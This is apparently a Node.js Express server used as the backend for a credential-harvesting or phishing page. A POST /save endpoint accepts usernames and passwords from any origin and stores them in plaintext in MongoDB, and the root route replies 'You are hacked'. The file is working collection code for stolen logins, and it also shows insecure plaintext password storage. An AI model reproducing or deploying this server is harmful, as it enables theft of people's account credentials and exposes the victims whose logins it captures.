const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const Account = require("./Model/Account");

const app = express();
app.use(express.json());
app.use(cors());

require("dotenv").config();
const PORT = process.env.PORT;
const URL = process.env.URL;

app.post("/save", (req, res) => {
  let { username, password } = req.body;

  try {
    const account = new Account({
      username,
      password,
    });
    account
      .save()
      .then(() => {
        res.status(201).json({ success: true });
      })
      .catch((err) => {
        res.status(400).json({ success: false });
      });
  } catch (error) {
    res.status(400).json();
  }
});

mongoose
  .connect(URL)
  .then(() => {
    console.log("Connected to db");
  })
  .catch((err) => {
    console.log("error in connecting to db");
  });

app.get("/", (req, res) => {
  res.send("You are hacked");
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
